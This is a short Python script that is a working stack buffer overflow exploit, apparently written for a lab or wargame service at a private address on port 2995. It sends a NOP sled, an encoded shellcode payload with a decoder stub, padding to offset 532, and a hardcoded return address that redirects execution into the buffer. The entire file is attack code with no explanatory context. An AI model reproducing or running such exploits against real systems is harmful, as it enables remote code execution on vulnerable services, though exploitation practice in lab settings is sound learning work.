import struct
import socket

# offset at 532
# buffer at 0xbffffa48

OFFSET = 532
BUFFER_LOCATION = 0xbffffa48

sock = socket.socket()
sock.connect(("172.16.104.130", 2995))

shellcode = "\x90" * 10 # len = 10
shellcode += "\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xedDBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKBAFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIAJDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJOBLAALMNIA"

length = len(shellcode)

shellcode += 'A' * (OFFSET - length)

shellcode += struct.pack("I", BUFFER_LOCATION)

sock.send(shellcode)

sock.close()

#print shellcode

